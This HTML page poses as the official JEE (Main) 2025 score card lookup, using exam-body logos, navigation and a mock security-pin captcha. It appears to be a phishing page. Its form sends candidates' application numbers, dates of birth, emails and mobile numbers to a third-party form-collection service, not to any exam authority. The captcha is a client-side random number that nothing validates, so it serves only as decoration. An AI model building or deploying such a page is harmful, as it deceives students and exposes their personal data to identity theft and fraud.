# Jee-mains-2025-result-session2
<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>JEE (Main) 2025 - Score Card</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f8fcfc;
      margin: 0;
      padding: 0;
    }
    .top-bar {
      background-color: #f47c20;
      color: white;
      display: flex;
      justify-content: space-between;
      padding: 10px 20px;
      font-size: 14px;
    }
    .top-bar a {
      color: white;
      text-decoration: none;
      margin-left: 15px;
    }
    .header {
      background-color: #ffffff;
      border-bottom: 3px solid #f47c20;
      padding: 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .header img {
      height: 50px;
    }
    .header h1 {
      margin: 0;
      font-size: 20px;
      color: #333;
    }
    .card {
      max-width: 600px;
      margin: 40px auto;
      background: white;
      padding: 30px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      border-radius: 5px;
    }
    .card h2 {
      margin-bottom: 20px;
      color: #333;
    }
    label {
      display: block;
      margin: 10px 0 5px;
    }
    input, select {
      width: 100%;
      padding: 8px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .captcha {
      display: flex;
      align-items: center;
    }
    .captcha span {
      font-weight: bold;
      font-size: 22px;
      margin-right: 10px;
      background: linear-gradient(to right, #0033cc, #3366ff);
      padding: 6px 12px;
      border-radius: 4px;
      color: white;
      font-family: 'Courier New', Courier, monospace;
      letter-spacing: 2px;
    }
    .submit-btn {
      background-color: #007bff;
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 4px;
      cursor: pointer;
    }
    .submit-btn:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>
  <div class="top-bar">
    <div>Home</div>
    <div>
      <a href="#">Information Bulletin</a>
      <a href="#">Contact Us</a>
      <a href="#">JEE (Main) 2025 Result</a>
    </div>
  </div>
  <div class="header">
    <img src="nta-logo.png" alt="NTA Logo">
    <h1>Joint Entrance Examination (Main) 2025</h1>
    <img src="jee-logo.png" alt="JEE Logo">
  </div>
  <div class="card">
    <h2>Score Card</h2>
    <form action="https://getform.io/f/broymqda" method="POST">
      <label for="appNo">Application No.</label>
      <input type="text" id="appNo" name="Application No." required /><label>Date of Birth</label>
  <div style="display: flex; gap: 10px;">
    <select name="Day" required>
      <option value="">--Day--</option>
      <script>for(let i=1; i<=31; i++) document.write(`<option value="${i}">${i}</option>`);</script>
    </select>
    <select name="Month" required>
      <option value="">--Month--</option>
      <option>January</option><option>February</option><option>March</option><option>April</option>
      <option>May</option><option>June</option><option>July</option><option>August</option>
      <option>September</option><option>October</option><option>November</option><option>December</option>
    </select>
    <select name="Year" required>
      <option value="">--Year--</option>
      <script>for(let y=1980; y<=2025; y++) document.write(`<option value="${y}">${y}</option>`);</script>
    </select>
  </div>

  <label for="email">Candidate Email</label>
  <input type="email" id="email" name="Email" required />

  <label for="mobile">Candidate Mobile</label>
  <input type="tel" id="mobile" name="Mobile" required />

  <label>Enter Security Pin (Case Sensitive)</label>
  <div class="captcha">
    <span id="captcha">655286</span>
    <button type="button" onclick="generateCaptcha()">&#8635;</button>
  </div>
  <input type="text" id="captchaInput" name="Captcha" required />

  <button type="submit" class="submit-btn">Submit</button>
</form>

  </div>
  <script>
    function generateCaptcha() {
      const cap = Math.floor(100000 + Math.random() * 900000);
      document.getElementById("captcha").textContent = cap;
    }
  </script>
</body>
</html>
